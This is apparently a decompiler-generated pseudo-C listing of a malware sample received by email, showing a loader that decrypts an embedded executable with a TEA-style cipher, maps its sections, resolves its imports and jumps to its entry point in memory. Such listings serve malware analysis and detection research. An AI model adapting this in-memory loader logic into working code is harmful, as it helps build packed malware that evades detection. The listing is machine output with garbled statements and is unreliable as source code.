/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0512/ia32_pe/subject.exe'
 */

/*	Procedure: 0x003E1000 - 0x003E101E
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1000(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    (save)ecx;
    *(ebp - 8) = A8;
    eax = *(ebp - 8);
    *(ebp - 4) = *(ebp - 8) + *(eax + 60);
    return(*(ebp - 4));
}

/*	Procedure: 0x003E101F - 0x003E1047
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E101F(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    L003E1942(Ac, A8, A10);
    return(*__imp__VirtualProtect(Ac, A10, 2, ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E1048 - 0x003E1080
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1048()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    if(*(ebp + 8) == 0 || *(ebp + 8) == *L003E881C) {
        *(ebp + 8) = *L003E8818;
    }
    eax = *L003e8810( *(ebp + 8), *(ebp + 12), *(ebp + 16));
    (restore)ebp;
}

/*	Procedure: 0x003E1081 - 0x003E10AF
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1081(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    if(A8 == 0 || A8 == *L003E881C) {
        A8 = *L003E8818;
    }
    return(*L003e8814(A8, Ac, A10));
}

stack space not deallocated on return
/*	Procedure: 0x003E10B0 - 0x003E1121
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E10B0()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    (save) *(ebp + 16);
    (save) *(ebp + 8);
    *(ebp - 4) = *__imp__GetProcAddress();
    if(L003E1A30( *(ebp + 12), 4071472) == 0) {
        if(L003E19AF( *(ebp + 16), 4071488) == 0) {
            *L003E8810 = *(ebp - 4);
            eax = 0x3e1050;
        } else {
            if(L003E19AF( *(ebp + 16), 4071508) != 0) {
                goto L003e111d;
            }
            *L003E8814 = *(ebp - 4);
            eax = 0x3e1081;
        }
    } else {
L003e111d:
        eax = *(ebp - 4);
    }
    esp = ebp;
}

/*	Procedure: 0x003E1122 - 0x003E1135
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1122()
{
	/* unknown */ void  ebp;



    eax = ~( *(esp + 8) & -2147483648);
    asm("sbb eax,eax");
    return(~eax);
}

stack space not deallocated on return
/*	Procedure: 0x003E1136 - 0x003E1260
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1136()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 36;
    *L003E8818 = *__imp__GetModuleHandleA(0);
    *L003E881C = *(ebp + 12);
    *(ebp - 8) = *(ebp + 8) + 128;
    (save) *(ebp + 12);
    for(*(ebp - 4) = ecx + *( *(ebp - 8)); 1; *(ebp - 4) = *(ebp - 4) + 20) {
        eax = *(ebp - 4);
        if(*(eax + 12) == 0) {
            break;
        }
        *(ebp - 12) = 0;
        *(ebp - 16) = 0;
        eax = *(ebp - 4);
        *(ebp - 28) = *(ebp + 12) + *(eax + 12);
        *(ebp - 24) = *__imp__LoadLibraryA( *(ebp - 28));
        if(*( *(ebp - 4) + 4) != 0) {
            eax = *(ebp - 4);
            *(ebp - 12) = *(ebp + 12) + *eax;
        } else {
            (save) *(ebp + 12);
            *(ebp - 12) = ecx + *( *(ebp - 4) + 16);
        }
        eax = *(ebp - 4);
        for(*(ebp - 20) = *(ebp + 12) + *(eax + 16); *( *(ebp - 12)) != 0; *(ebp - 12) = *(ebp - 12) + 4) {
            L003E1122( *( *(ebp - 12)), *(ebp - 24));
            if((al & 255) == 0) {
                eax = *(ebp - 12);
                *(ebp - 36) = *(ebp + 12) + *eax;
                *(ebp - 16) = L003E10B0( *(ebp - 24), *(ebp - 28), *(ebp - 36) + 1 + 1);
            } else {
                *(ebp - 32) = *( *(ebp - 12)) & 65535;
                (save) *(ebp - 32) & 65535;
                (save) *(ebp - 24);
                *(ebp - 16) = *__imp__GetProcAddress();
            }
            eax = *(ebp - 20);
            *eax = *(ebp - 16);
            *(ebp - 20) = *(ebp - 20) + 4;
        }
    }
    esp = ebp;
}

/*	Procedure: 0x003E1261 - 0x003E126F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1261()
{



}

/*	Procedure: 0x003E1270 - 0x003E12A5
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1270(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    *(ebp - 4) = 0;
    do {
        eax = *__imp__ReadFile(A8, Ac, A10 - *(ebp - 4), ebp - 4, 0);
        if(eax == 0) {
            goto L003e1295;
        }
        eax = *(ebp - 4);
    } while(eax != A10);
    goto L003e12a2;
L003e1295:
    al = 0;
    goto L003e12a4;
L003e12a2:
    al = 1;
L003e12a4:
}

stack space not deallocated on return
/*	Procedure: 0x003E12A6 - 0x003E12DB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E12A6()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = 0;
    do {
        eax = *__imp__WriteFile( *(ebp + 8), *(ebp + 12), *(ebp + 16) - *(ebp - 4), ebp - 4, 0);
        if(eax == 0) {
            goto L003e12cc;
        }
        eax = *(ebp - 4);
    } while(eax != *(ebp + 16));
    goto L003e12d8;
L003e12cc:
    al = 0;
    goto L003e12da;
L003e12d8:
    al = 1;
L003e12da:
}

/*	Procedure: 0x003E12DC - 0x003E132F
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E12DC(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    for(*(ebp - 4) = 0; 1; *(ebp - 4) = *(ebp - 4) + 1 + 1) {
        eax = *(ebp - 4);
        if(eax >= A10) {
            break;
        }
        eax = *(ebp - 4);
        L003E12A6( *(A8 + 4), Ac + eax * 4, 8);
        eax = *(ebp - 4);
        L003E1270( *A8, Ac + eax * 4, 8);
    }
}

/*	Procedure: 0x003E1330 - 0x003E141D
 *	Argument size: -28
 *	Local size: 32
 *	Save regs size: 0
 */

L003E1330(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    for(Vfffffff4 = A8; 1; L003E12A6( *(Vfffffff4 + 4), & Vfffffff8, 8)) {
        L003E1270( *Vfffffff4, & Vfffffff8, 8);
        if((al & 255) == 0) {
            break;
        }
        Vffffffec = 32;
        Vfffffff0 = Vfffffff8;
        Vffffffe8 = Vfffffffc;
        Vffffffe0 = -1640531527;
        for(Vffffffe4 = Vffffffe0 << 5; 1; Vffffffe4 = Vffffffe4 - Vffffffe0) {
            Vffffffec = Vffffffec - 1;
            if(Vffffffec <= 0) {
                break;
            }
            Vffffffe8 = Vffffffe8 - ((Vfffffff0 << 4) + *L0040FC85 ^ Vfffffff0 + Vffffffe4 ^ (Vfffffff0 >> 5) + *L0040FC89);
            Vfffffff0 = Vfffffff0 - ((Vffffffe8 << 4) + *L0040FC7D ^ Vffffffe8 + Vffffffe4 ^ (Vffffffe8 >> 5) + *L0040FC81);
        }
        Vfffffff8 = Vfffffff0;
        Vfffffffc = Vffffffe8;
    }
    return(0);
}

stack space not deallocated on return
/*	Procedure: 0x003E141E - 0x003E143A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E141E()
{
	/* unknown */ void  ebp;



    ebp = esp;
    *__imp__CloseHandle();
    return(*__imp__CloseHandle( *( *(ebp + 8) + 4), *( *(ebp + 8))));
}

/*	Procedure: 0x003E143B - 0x003E15B4
 *	Argument size: -48
 *	Local size: 48
 *	Save regs size: 0
 */

L003E143B()
{
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = L003E15D0();
    Vffffffe8 = *(Vfffffffc + 48);
    if(( *(Vffffffe8 + 2) & 255) != 0) {
        eax = 0;
    } else {
        *L0040FC7D = 17757;
        *L0040FC81 = 14108;
        *L0040FC85 = 22572;
        *L0040FC89 = 8397;
        *L0040FC89 = *L0040FC89 + 19255;
        (save)16;
        (save)0;
        (save) & Vfffffff0;
        (save) & Vffffffe0;
        if(*__imp__CreatePipe() == 0) {
            eax = 0;
        } else {
            (save)16;
            (save)0;
            (save) & Vffffffe4;
            (save) & Vffffffec;
            if(*__imp__CreatePipe() == 0) {
                eax = 0;
            } else {
                (save) & Vfffffff8;
                (save)0;
                (save) & Vffffffe0;
                (save)0x3e1330;
                (save)0;
                (save)0;
                Vffffffdc = *__imp__CreateThread();
                L003E12DC( & Vffffffec, 0x3e3000, *L003E8803 >> 2);
                L003E141E( & Vffffffec);
                L003E141E( & Vffffffe0);
                (save)Vffffffdc;
                *__imp__CloseHandle();
                Vfffffff4 = L003E1000(0x3e3000);
                if(Vfffffff4 != 0) {
                    Vffffffd4 = *(Vfffffff4 + 52);
                    L003E101F(0x3e3000, Vffffffd4, *(Vfffffff4 + 84));
                    L003E15E0(Vfffffff4, 0x3e3000, Vffffffd4);
                    Vffffffd8 = L003E1000(Vffffffd4);
                    if(Vffffffd8 != 0) {
                        L003E1136(Vffffffd8, Vffffffd4);
                        L003E1776(Vffffffd8, Vffffffd4);
                        *(Vffffffe8 + 8) = Vffffffd4;
                        Vffffffd0 = Vffffffd4 + *(Vfffffff4 + 40);
                        Vffffffd0();
                    }
                }
                eax = 0;
            }
        }
    }
}

/*	Procedure: 0x003E15B5 - 0x003E15CB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)ecx;
    *(ebp - 4) = L003E143B();
    return(*__imp__ExitProcess( *(ebp - 4)));
}

/*	Procedure: 0x003E15CC - 0x003E15CF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E15CC()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E15D0 - 0x003E15DC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E15D0()
{
	/* unknown */ void  ebp;



    ebp = esp;
    return(*%fs:0x18]);
}

/*	Procedure: 0x003E15DD - 0x003E15DF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E15DD()
{



    asm("int3");
    asm("int3");
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x003E15E0 - 0x003E16AA
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E15E0()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 40;
    *(ebp - 12) = *(ebp + 8) + 248;
    *(ebp - 8) = *( *(ebp + 8) + 6);
    *(ebp - 4) = *(ebp - 12);
    for(*(ebp - 16) = 0; 1; *(ebp - 16) = *(ebp - 16) + 1) {
        eax = *(ebp - 16) & 65535;
        if(eax >= ( *(ebp - 8) & 65535)) {
            break;
        }
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        *(ebp - 36) = *(eax + *(ebp - 4) + 8);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        *(ebp - 20) = *(eax + *(ebp - 4) + 16);
        *(ebp - 40) = *(ebp - 36) >= *(ebp - 20) ? *(ebp - 20) : *(ebp - 36);
        *(ebp - 24) = *(ebp - 40);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        ecx = *(ebp - 4);
        *(ebp - 28) = *(ebp + 16) + *(eax + ecx + 12);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        ecx = *(ebp - 4);
        *(ebp - 32) = *(ebp + 12) + *(eax + ecx + 20);
        L003E1942( *(ebp - 28), *(ebp - 32), *(ebp - 24));
    }
    esp = ebp;
}

/*	Procedure: 0x003E16AB - 0x003E1775
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E16AB(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    *(ebp - 4) = 0;
    if(!(eax = A8 & 67108864)) {
        *(ebp - 4) = *(ebp - 4) | 512;
    }
    *(ebp - 4) = !(eax = A8 & 536870912) ? !(eax = A8 & 1073741824) ? !(eax = A8 & -2147483648) ? *(ebp - 4) | 64 : *(ebp - 4) | 32 : !(eax = A8 & -2147483648) ? *(ebp - 4) | 128 : *(ebp - 4) | 16 : !(eax = A8 & 1073741824) ? !(eax = A8 & -2147483648) ? *(ebp - 4) | 4 : *(ebp - 4) | 2 : !(eax = A8 & -2147483648) ? *(ebp - 4) | 8 : *(ebp - 4) | 1;
    return(*(ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E1776 - 0x003E180A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1776()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 28;
    *(ebp - 12) = *(ebp + 8) + 248;
    *(ebp - 8) = *( *(ebp + 8) + 6);
    *(ebp - 4) = *(ebp - 12);
    for(*(ebp - 16) = 0; 1; *(ebp - 16) = *(ebp - 16) + 1) {
        eax = *(ebp - 16) & 65535;
        if(eax >= ( *(ebp - 8) & 65535)) {
            break;
        }
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        ecx = *(ebp - 4);
        *(ebp - 24) = *(ebp + 12) + *(eax + ecx + 12);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        *(ebp - 28) = *(eax + *(ebp - 4) + 8);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        *__imp__VirtualProtect( *(ebp - 24), *(ebp - 28), L003E16AB( *(eax + *(ebp - 4) + 36)), ebp - 20);
    }
}

/*	Procedure: 0x003E180B - 0x003E180F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E180B()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1810 - 0x003E182C
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1810(A8)
/* unknown */ void  A8;
{



    if(A8 >= 65) {
        if(A8 > 90) {
            goto L003e1827;
        }
        A8 = A8 + 32;
    } else {
L003e1827:
    }
}

/*	Procedure: 0x003E182D - 0x003E1848
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E182D(A8)
/* unknown */ void  A8;
{



    if(A8 >= 97) {
        if(A8 > 122) {
            goto L003e1844;
        }
        A8 = A8 - 32;
    } else {
L003e1844:
    }
}

/*	Procedure: 0x003E1849 - 0x003E1854
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1849()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
}

/*	Procedure: 0x003E1855 - 0x003E1859
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1855()
{
	/* unknown */ void  ebp;



    ebp = esp;
}

/*	Procedure: 0x003E185A - 0x003E1866
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E185A()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
    return(0);
}

/*	Procedure: 0x003E1867 - 0x003E186D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1867()
{



    return(0);
}

/*	Procedure: 0x003E186E - 0x003E1874
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E186E()
{



    return(0);
}

/*	Procedure: 0x003E1875 - 0x003E1879
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1875()
{
	/* unknown */ void  ebp;



    ebp = esp;
}

/*	Procedure: 0x003E187A - 0x003E1880
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E187A()
{



    return(0);
}

/*	Procedure: 0x003E1881 - 0x003E1885
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1881()
{
	/* unknown */ void  ebp;



    ebp = esp;
}

/*	Procedure: 0x003E1886 - 0x003E1894
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1886()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
}

/*	Procedure: 0x003E1895 - 0x003E18A4
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1895(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    *(ebp - 4) = A8;
    *(ebp - 3) = 0;
    return(*(ebp - 4));
}

/*	Procedure: 0x003E18A5 - 0x003E18A9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E18A5()
{
	/* unknown */ void  ebp;



    ebp = esp;
}

/*	Procedure: 0x003E18AA - 0x003E18C2
 *	Argument size: -28
 *	Local size: 32
 *	Save regs size: 0
 */

L003E18AA(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffe0;



    return(L003E1B6B(A8, & Vffffffe0, 10));
}

/*	Procedure: 0x003E18C3 - 0x003E18DB
 *	Argument size: -28
 *	Local size: 32
 *	Save regs size: 0
 */

L003E18C3(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffe0;



    return(L003E1A90(A8, & Vffffffe0, 10));
}

stack space not deallocated on return
/*	Procedure: 0x003E18DC - 0x003E1941
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E18DC()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); *(ebp + 16) != 0; *(ebp + 16) = *(ebp + 16) - 1) {
        eax = *(ebp + 8);
        *eax = *( *(ebp + 12));
        eax = *( *(ebp + 8));
        *(ebp + 8) = *(ebp + 8) + 1;
        *(ebp + 12) = *(ebp + 12) + 1;
        if(eax == 0) {
            break;
        }
    }
    if(*(ebp + 16) != 0) {
        while(!( *(ebp + 16) = *(ebp + 16) - 1)) {
            *( *(ebp + 8)) = 0;
            *(ebp + 8) = *(ebp + 8) + 1;
        }
    }
    eax = *(ebp - 4);
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x003E1942 - 0x003E197C
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1942(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    for(*(ebp - 4) = A8; 1; Ac = Ac + 1) {
        A10 = A10 - 1;
        if(A10 == 0) {
            break;
        }
        *A8 = *Ac;
        A8 = A8 + 1;
    }
    return(*(ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E197D - 0x003E19AE
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E197D()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); 1; *(ebp + 8) = *(ebp + 8) + 1) {
        eax = *(ebp + 16);
        *(ebp + 16) = *(ebp + 16) - 1;
        if(eax == 0) {
            break;
        }
        eax = *(ebp + 8);
        *eax = *(ebp + 12);
    }
    eax = *(ebp - 4);
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E19AF - 0x003E1A08
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E19AF()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = 0; 1; *(ebp + 12) = *(ebp + 12) + 1) {
        eax = *( *(ebp + 8)) & 255;
        if(( *(ebp - 4) = eax - ( *( *(ebp + 12)) & 255)) || *( *(ebp + 12)) == 0) {
            break;
        }
        *(ebp + 8) = *(ebp + 8) + 1;
    }
    if(*(ebp - 4) < 0) {
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        if(*(ebp - 4) > 0) {
            *(ebp - 4) = 0;
            *(ebp - 4) = *(ebp - 4) + 1;
        }
    }
    eax = *(ebp - 4);
    esp = ebp;
}

/*	Procedure: 0x003E1A09 - 0x003E1A2F
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1A09(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    *(ebp - 4) = A8;
    while(1) {
        eax = *( *(ebp - 4));
        *(ebp - 4) = *(ebp - 4) + 1;
        if(eax == 0) {
            break;
        }
    }
    return(*(ebp - 4) - A8 - 1);
}

/*	Procedure: 0x003E1A30 - 0x003E1A87
 *	Argument size: -8
 *	Local size: 16
 *	Save regs size: 0
 */

L003E1A30(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    do {
        Vfffffff4 = *A8 & 255;
        Vfffffffc = L003E1810(Vfffffff4);
        A8 = A8 + 1;
        Vfffffff0 = *Ac & 255;
        Vfffffff8 = L003E1810(Vfffffff0);
        Ac = Ac + 1;
    } while(Vfffffffc != 0 && Vfffffffc == Vfffffff8);
    return(Vfffffffc - Vfffffff8);
}

/*	Procedure: 0x003E1A88 - 0x003E1A8F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1A88()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1A90 - 0x003E1AAB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1A90()
{
	/* unknown */ void  ebp;



    ebp = esp;
    L003E1AAC( *(ebp + 8), *(ebp + 12), *(ebp + 16), 0);
    return(*(ebp + 12));
}

/*	Procedure: 0x003E1AAC - 0x003E1B6A
 *	Argument size: 0
 *	Local size: 16
 *	Save regs size: 0
 */

L003E1AAC(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff7;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = Ac;
    if(A14 != 0) {
        *Vfffffffc = 45;
        Vfffffffc = Vfffffffc + 1;
        A8 = ~A8;
    }
    Vfffffff0 = Vfffffffc;
    do {
        eax = A8;
        edx = 0;
        A10 = A10 / A10;
        Vfffffff8 = A10 % A10;
        edx = 0;
        A10 = A10 / A10;
        edx = A10 % A10;
        0;
        if(Vfffffff8 <= 9) {
            eax = Vfffffff8 + 48;
            *Vfffffffc = al;
            Vfffffffc = Vfffffffc + 1;
        } else {
            eax = Vfffffff8 + 87;
            *Vfffffffc = al;
            Vfffffffc = Vfffffffc + 1;
        }
    } while(A8 > 0);
    *Vfffffffc = 0;
    Vfffffffc = Vfffffffc - 1;
    do {
        Vfffffff7 = *Vfffffffc;
        *Vfffffffc = *Vfffffff0;
        *Vfffffff0 = Vfffffff7;
        Vfffffffc = Vfffffffc - 1;
        Vfffffff0 = Vfffffff0 + 1;
        eax = Vfffffff0;
    } while(eax < Vfffffffc);
}

/*	Procedure: 0x003E1B6B - 0x003E1BA7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1B6B()
{
	/* unknown */ void  ebp;



    ebp = esp;
    if(*(ebp + 16) == 10) {
        if(*(ebp + 8) >= 0) {
            goto L003e1b8f;
        }
        L003E1AAC( *(ebp + 8), *(ebp + 12), *(ebp + 16), 1);
    } else {
L003e1b8f:
        L003E1AAC( *(ebp + 8), *(ebp + 12), *(ebp + 16), 0);
    }
    return(*(ebp + 12));
}

/*	Procedure: 0x003E1BA8 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1BA8()
{



}

/* address  size  */
/* 0x003e15b5       0 */ /* unknown */ void 	__entry_point__;
/* 0x003e2000       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x003e2004       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x003e2008       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x003e200c       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x003e2010       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x003e2014       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x003e2018       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x003e201c       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x003e2020       0 */ /* unknown */ void 	__imp__CreatePipe;
/* 0x003e2024       0 */ /* unknown */ void 	__imp__ExitProcess;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
